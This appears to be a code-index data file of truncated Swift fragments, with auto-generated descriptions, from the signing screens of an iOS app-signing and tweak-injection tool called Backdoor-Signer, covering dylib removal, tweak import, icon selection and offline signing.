3076,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift","Function loadAlternateIcons - implements loadalternateicons functionality","private func loadAlternateIcons() -> [String: String] {
let infoPlistPath = applicationPath.appendingPathComponent(""Info.plist"")
guard let infoPlist = NSDictionary(contentsOf: infoPlistPath),
let iconDict = infoPlist[""CFBundleIcons""] as? [String: Any],
let alternateIcons = iconDict[""CFBundleAlternateIcons""] as? [String: [String: Any]]
else {"
3077,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift","struct IconButton - implements functionality related to icon button","private struct IconButton: View {
let iconPath: String
let name: String
let applicationPath: URL
let action: () -> Void

var body: some View {"
3078,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","class SigningsAdvancedViewController - Controls user interface and application flow","class SigningsAdvancedViewController: FRSITableViewController {
private var toggleOptions: [TogglesOption]

override init(signingDataWrapper: SigningDataWrapper, mainOptions: SigningMainDataWrapper) {"
3079,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

tableData = [
[String.localized(""APP_SIGNING_INPUT_VIEW_CONTROLLER_SECTION_TITLE_APPEARENCE"")],
[String.localized(""APP_SIGNING_INPUT_VIEW_CONTROLLER_SECTION_TITLE_MINIMUM_APP_VERSION"")],
[""Custom Entitlements""],
[],
]
"
3080,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Add LED effects to important cells
DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) { [weak self] in"
3081,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","/ Add LED effects to highlight important settings cells","private func addLEDEffectsToImportantCells() {
// Get visible cells to apply effects only to what the user can see
let visibleCells = tableView.visibleCells

for cell in visibleCells {"
3082,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","extension SigningsAdvancedViewController - Controls user interface and application flow","extension SigningsAdvancedViewController {
override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
3083,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let reuseIdentifier = ""Cell""
let cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)
cell.accessoryType = .none
cell.selectionStyle = .gray

let cellText = tableData[indexPath.section][indexPath.row]
cell.textLabel?.text = cellText

switch cellText {"
3084,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
let cellText = tableData[indexPath.section][indexPath.row]

if cellText == ""Custom Entitlements"" {"
3085,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","extension SigningsAdvancedViewController - Controls user interface and application flow","extension SigningsAdvancedViewController {
@objc private func forceLightDarkAppearenceDidChange(_ sender: UISegmentedControl) {"
3086,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","Function forceLightDarkAppearenceDidChange - implements forcelightdarkappearencedidchange functionality","@objc private func forceLightDarkAppearenceDidChange(_ sender: UISegmentedControl) {
signingDataWrapper.signingOptions.forceLightDarkAppearence =
mainOptions.mainOptions.forceLightDarkAppearenceString[sender.selectedSegmentIndex]
}

@objc private func forceMinimumVersionDidChange(_ sender: UISegmentedControl) {"
3087,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","Function forceMinimumVersionDidChange - implements forceminimumversiondidchange functionality","@objc private func forceMinimumVersionDidChange(_ sender: UISegmentedControl) {
signingDataWrapper.signingOptions.forceMinimumVersion =
mainOptions.mainOptions.forceMinimumVersionString[sender.selectedSegmentIndex]
}

@objc func toggleOptionsSwitches(_ sender: UISwitch) {"
3088,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift","Function toggleOptionsSwitches - implements toggleoptionsswitches functionality","@objc func toggleOptionsSwitches(_ sender: UISwitch) {
switch sender.tag {"
3089,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","class SigningsDylibViewController - Controls user interface and application flow","class SigningsDylibViewController: UITableViewController {
var applicationPath: URL
var groupedDylibs: [String: [String]] = [:]
var dylibSections: [String] = [""@rpath"", ""@executable_path"", ""/usr/lib"", ""/System/Library"", ""Other""]
var dylibstoremove: [String] = [] {"
3090,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupViews()
setupNavigation()
dylibstoremove = mainOptions.mainOptions.removeInjectPaths
}

fileprivate func setupViews() {"
3091,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","Function setupViews - sets upviews","fileprivate func setupViews() {
tableView.dataSource = self
tableView.delegate = self
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""dylibCell"")

let alertController = UIAlertController(
title: ""ADVANCED USERS ONLY"",
message: ""This section can make installed applications UNUSABLE and potentially UNSTABLE. USE THIS SECTION WITH CAUTION, IF YOU HAVE NO IDEA WHAT YOU'RE DOING, PLEASE LEAVE.\n\nIF YOU MAKE AN ISSUE ON THIS, IT WILL IMMEDIATELY BE CLOSED AND IGNORED."",
preferredStyle: .alert
)"
3092,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
title = ""Remove Dylibs""
}

fileprivate func groupDylibs(_ dylibs: [String]) {"
3093,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","Function groupDylibs - implements groupdylibs functionality","fileprivate func groupDylibs(_ dylibs: [String]) {
groupedDylibs[""@rpath""] = dylibs.filter { $0.hasPrefix(""@rpath"") }"
3094,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int {
return dylibSections.count
}

override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
3095,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
let key = dylibSections[section]
return groupedDylibs[key]?.count ?? 0
}

override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {"
3096,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {
return dylibSections[section]
}

override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
3097,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""dylibCell"", for: indexPath)
let key = dylibSections[indexPath.section]
if let dylib = groupedDylibs[key]?[indexPath.row] {"
3098,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift","Function tableView - implements tableview functionality","override func tableView(
_ tableView: UITableView,
commit editingStyle: UITableViewCell.EditingStyle,
forRowAt indexPath: IndexPath
) {"
3099,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift","class SigningsInputViewController - Controls user interface and application flow","class SigningsInputViewController: UITableViewController {
var parentView: SigningsViewController
var initialValue: String
var valueToSaveTo: Int
private var changedValue: String?

private lazy var textField: UITextField = {"
3100,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
navigationItem.largeTitleDisplayMode = .never
title = initialValue.capitalized

let saveButton = UIBarButtonItem(
title: String.localized(""SAVE""),
style: .done,
target: self,
action: #selector(saveButton)"
3101,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift","Function saveButton - implements savebutton functionality","@objc func saveButton() {
switch valueToSaveTo {"
3102,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift","Function textDidChange - implements textdidchange functionality","@objc private func textDidChange() {
navigationItem.rightBarButtonItem?.isEnabled = !(textField.text?.isEmpty ?? true)
changedValue = textField.text
}

override func numberOfSections(in _: UITableView) -> Int { return 1 }"
3103,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int { return 1 }
override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int { return 1 }"
3104,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int { return 1 }

override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
3105,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""InputCell"", for: indexPath)
switch indexPath.section {"
3106,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","class SigningsTweakViewController - Controls user interface and application flow","class SigningsTweakViewController: UICollectionViewController, UICollectionViewDelegateFlowLayout {
var tweaksToInject: [String] = [] {"
3107,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
title = String.localized(""APP_SIGNING_TWEAK_VIEW_CONTROLLER_TITLE"")
navigationItem.largeTitleDisplayMode = .never
collectionView.register(
ProductCollectionViewCell.self,
forCellWithReuseIdentifier: ProductCollectionViewCell.reuseIdentifier
)

navigationItem.rightBarButtonItem = UIBarButtonItem("
3108,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function openDocuments - implements opendocuments functionality","@objc func openDocuments() {
importFile()
}

@available(*, unavailable)
required init?(coder _: NSCoder) {"
3109,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","extension SigningsTweakViewController - Controls user interface and application flow","extension SigningsTweakViewController {
override func numberOfSections(in _: UICollectionView) -> Int {"
3110,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UICollectionView) -> Int {
return 1
}

override func collectionView(_: UICollectionView, numberOfItemsInSection _: Int) -> Int {"
3111,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function collectionView - implements collectionview functionality","override func collectionView(_: UICollectionView, numberOfItemsInSection _: Int) -> Int {
return tweaksToInject.count
}

func collectionView(
_ collectionView: UICollectionView,
layout collectionViewLayout: UICollectionViewLayout,
sizeForItemAt _: IndexPath
) -> CGSize {"
3112,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function collectionView - implements collectionview functionality","func collectionView(
_ collectionView: UICollectionView,
layout collectionViewLayout: UICollectionViewLayout,
sizeForItemAt _: IndexPath
) -> CGSize {"
3113,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function collectionView - implements collectionview functionality","override func collectionView(_ collectionView: UICollectionView,
cellForItemAt indexPath: IndexPath) -> UICollectionViewCell
{"
3114,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function collectionView - implements collectionview functionality","override func collectionView(
_: UICollectionView,
contextMenuConfigurationForItemAt indexPath: IndexPath,
point _: CGPoint
) -> UIContextMenuConfiguration? {"
3115,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","extension SigningsTweakViewController - Controls user interface and application flow","extension SigningsTweakViewController: UIDocumentPickerDelegate {
func importFile() {"
3116,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function importFile - implements importfile functionality","func importFile() {
presentDocumentPicker(fileExtension: [
UTType(filenameExtension: ""deb"")!,
UTType(filenameExtension: ""dylib"")!,
])
}

func presentDocumentPicker(fileExtension: [UTType]) {"
3117,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function presentDocumentPicker - implements presentdocumentpicker functionality","func presentDocumentPicker(fileExtension: [UTType]) {
let documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: fileExtension, asCopy: true)
documentPicker.delegate = self
documentPicker.allowsMultipleSelection = false
present(documentPicker, animated: true, completion: nil)
}

func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {"
3118,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function documentPicker - implements documentpicker functionality","func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
guard let selectedFileURL = urls.first else { return }"
3119,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function documentPickerWasCancelled - implements documentpickerwascancelled functionality","func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
controller.dismiss(animated: true, completion: nil)
}
}

class ProductCollectionViewCell: UICollectionViewCell {"
3120,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","class ProductCollectionViewCell - implements functionality related to product collection view cell","class ProductCollectionViewCell: UICollectionViewCell {
static let reuseIdentifier = ""ProductCell""

let imageView: UIImageView = {"
3121,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift","Function setupViews - sets upviews","private func setupViews() {
contentView.addSubview(stackView)
contentView.backgroundColor = .quaternarySystemFill
contentView.layer.cornerRadius = 19
contentView.layer.cornerCurve = .continuous
contentView.layer.masksToBounds = true

NSLayoutConstraint.activate([
stackView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 16),
stackView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 8),"
3122,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift","extension SigningsViewController - Controls user interface and application flow","extension SigningsViewController: UIDocumentPickerDelegate & UIImagePickerControllerDelegate,
UINavigationControllerDelegate
{"
3123,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift","Function importAppIconFile - implements importappiconfile functionality","func importAppIconFile() {
let actionSheet = UIAlertController(title: ""Select App Icon"", message: nil, preferredStyle: .actionSheet)

let altIconAction = UIAlertAction(title: ""Select Alt Icon"", style: .default) { _ in"
3124,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift","MARK: - Documents","func presentDocumentPicker(fileExtension: [UTType]) {
let documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: fileExtension, asCopy: true)
documentPicker.delegate = self
documentPicker.allowsMultipleSelection = false
present(documentPicker, animated: true, completion: nil)
}

func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {"
3125,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift","Function documentPicker - implements documentpicker functionality","func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
guard let selectedFileURL = urls.first else { return }"
3126,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift","Function documentPickerWasCancelled - implements documentpickerwascancelled functionality","func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
controller.dismiss(animated: true, completion: nil)
}

// MARK: - Library

func presentPhotoLibrary(mediaTypes: [String]) {"
3127,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift","MARK: - Library","func presentPhotoLibrary(mediaTypes: [String]) {
let imagePicker = UIImagePickerController()
imagePicker.delegate = self
imagePicker.sourceType = .photoLibrary
imagePicker.mediaTypes = mediaTypes
present(imagePicker, animated: true, completion: nil)
}

func imagePickerController(
_ picker: UIImagePickerController,"
3128,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift","Function imagePickerController - implements imagepickercontroller functionality","func imagePickerController(
_ picker: UIImagePickerController,
didFinishPickingMediaWithInfo info: [UIImagePickerController.InfoKey: Any]
) {"
3129,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift","Function imagePickerControllerDidCancel - implements imagepickercontrollerdidcancel functionality","func imagePickerControllerDidCancel(_ picker: UIImagePickerController) {
picker.dismiss(animated: true, completion: nil)
}
}
"
3130,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","MARK: - BundleOptions","struct BundleOptions {
var name: String?
var bundleId: String?
var version: String?
var sourceURL: URL?
}

// MARK: - SigningsViewController

class SigningsViewController: UIViewController {"
3131,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","MARK: - SigningsViewController","class SigningsViewController: UIViewController {
// MARK: - Constants

private enum Constants {"
3132,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","MARK: - Constants","private enum Constants {
static let tableBottomInset: CGFloat = 70
static let headerHeight: CGFloat = 40
static let buttonHeight: CGFloat = 50
static let buttonSideMargin: CGFloat = 16
static let buttonBottomMargin: CGFloat = 17
static let blurViewZPosition: CGFloat = 3
static let buttonZPosition: CGFloat = 4
static let iphoneBlurHeight: CGFloat = 80.0
static let ipadBlurHeight: CGFloat = 65.0"
3133,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function setupBundleOptions - sets upbundleoptions","private func setupBundleOptions(from application: NSManagedObject) {
guard let name = application.value(forKey: ""name"") as? String,
let bundleId = application.value(forKey: ""bundleidentifier"") as? String,
let version = application.value(forKey: ""version"") as? String
else {"
3134,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function configureCertificateAndUUID - implements configurecertificateanduuid functionality","private func configureCertificateAndUUID(from application: NSManagedObject) {
if let certificate = CoreDataManager.shared.getCurrentCertificate() {"
3135,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function handleProtectionSettings - implements handleprotectionsettings functionality","private func handleProtectionSettings() {
guard signingDataWrapper.signingOptions.ppqCheckProtection,
mainOptions.mainOptions.certificate?.certData?.pPQCheck == true,
let bundleId = bundle?.bundleId
else {"
3136,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function applyCustomConfigurations - implements applycustomconfigurations functionality","private func applyCustomConfigurations() {
// Apply custom bundle ID if configured
if let currentBundleId = bundle?.bundleId,
let newBundleId = signingDataWrapper.signingOptions.bundleIdConfig[currentBundleId]
{"
3137,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function checkDynamicProtection - implements checkdynamicprotection functionality","private func checkDynamicProtection() async {
guard signingDataWrapper.signingOptions.ppqCheckProtection,
mainOptions.mainOptions.certificate?.certData?.pPQCheck == true,
let bundleId = bundle?.bundleId
else {"
3138,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupNavigation()
setupViews()
setupToolbar()
setupGestures()

#if !targetEnvironment(simulator)
certAlert()
#endif"
3139,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
tableView.reloadData()
}

deinit {"
3140,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","MARK: - UI Setup","private func setupGestures() {
let swipeLeft = UISwipeGestureRecognizer(target: self, action: #selector(handleSwipe(_:)))
swipeLeft.direction = .left

let swipeRight = UISwipeGestureRecognizer(target: self, action: #selector(handleSwipe(_:)))
swipeRight.direction = .right

tableView.addGestureRecognizer(swipeLeft)
tableView.addGestureRecognizer(swipeRight)
}"
3141,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function setupNavigation - sets upnavigation","private func setupNavigation() {
let logoImageView = UIImageView(image: UIImage(named: ""backdoor_glyph""))
logoImageView.contentMode = .scaleAspectFit
navigationItem.titleView = logoImageView
navigationController?.navigationBar.prefersLargeTitles = false

isModalInPresentation = true
navigationItem.leftBarButtonItem = UIBarButtonItem(
title: String.localized(""DISMISS""),
style: .done,"
3142,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function setupViews - sets upviews","private func setupViews() {
tableView = UITableView(frame: .zero, style: .insetGrouped)
tableView.translatesAutoresizingMaskIntoConstraints = false
tableView.dataSource = self
tableView.delegate = self
tableView.showsHorizontalScrollIndicator = false
tableView.showsVerticalScrollIndicator = false
tableView.contentInset.bottom = Constants.tableBottomInset

view.addSubview(tableView)"
3143,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function setupToolbar - sets uptoolbar","private func setupToolbar() {
// Configure button
largeButton.translatesAutoresizingMaskIntoConstraints = false
largeButton.addTarget(self, action: #selector(startSign), for: .touchUpInside)

// Configure blur view
let gradientMask = VariableBlurViewConstants.defaultGradientMask
variableBlurView = UIVariableBlurView(frame: .zero)
variableBlurView?.gradientMask = gradientMask
variableBlurView?.transform = CGAffineTransform(rotationAngle: CGFloat.pi)"
3144,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function certAlert - implements certalert functionality","private func certAlert() {
guard mainOptions.mainOptions.certificate == nil else { return }"
3145,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","MARK: - Actions","@objc func closeSheet() {
dismiss(animated: true)
}

@objc func fetch() {"
3146,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function fetch - implements fetch functionality","@objc func fetch() {
tableView.reloadData()
}

@objc func handleSwipe(_ gesture: UISwipeGestureRecognizer) {"
3147,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function handleSwipe - implements handleswipe functionality","@objc func handleSwipe(_ gesture: UISwipeGestureRecognizer) {
let location = gesture.location(in: tableView)

// Check if swipe occurred on certificate cell
guard let indexPath = tableView.indexPathForRow(at: location),
indexPath.section == 1 && indexPath.row == 0
else {"
3148,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function startSign - implements startsign functionality","@objc func startSign() {
guard let bundle = bundle,
let app = application as? DownloadedApps else { return }"
3149,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","/ Show a visual indicator that we're in offline mode","private func showOfflineModeIndicator() {
// Create offline mode badge near the top of the view
let offlineIndicator = UILabel()
offlineIndicator.text = ""OFFLINE SIGNING""
offlineIndicator.font = UIFont.systemFont(ofSize: 12, weight: .bold)
offlineIndicator.textColor = .white
offlineIndicator.backgroundColor = UIColor.systemRed.withAlphaComponent(0.8)
offlineIndicator.textAlignment = .center
offlineIndicator.layer.cornerRadius = 10
offlineIndicator.clipsToBounds = true"
3150,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","/ Configure signing options specifically for offline mode","private func configureOfflineSigning() {
// Get offline certificates
let certificates = OfflineSigningManager.shared.getOfflineSigningCertificates()

// Log certificate paths
if let certPath = certificates.cert, let keyPath = certificates.key {"
3151,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","/ Show error specific to offline signing issues","private func showOfflineSigningError() {
DispatchQueue.main.async {"
3152,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function handleSuccessfulSigning - implements handlesuccessfulsigning functionality","private func handleSuccessfulSigning(signedPath: URL, signedApp: NSManagedObject) {
// Refresh app list
appsViewController?.fetchSources()
appsViewController?.tableView.reloadData()

// Log file path
backdoor.Debug.shared.log(message: signedPath.path)

// Install if needed
if signingDataWrapper.signingOptions.installAfterSigned {"
3153,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","MARK: - UITableViewDataSource & UITableViewDelegate","extension SigningsViewController: UITableViewDataSource, UITableViewDelegate {
func numberOfSections(in _: UITableView) -> Int {"
3154,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function numberOfSections - implements numberofsections functionality","func numberOfSections(in _: UITableView) -> Int {
return sectionTitles.count
}

func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
3155,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
return tableData[section].count
}

func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {"
3156,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {
return sectionTitles[section]
}

func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {"
3157,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
return sectionTitles[section].isEmpty ? 0 : Constants.headerHeight
}

func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {"
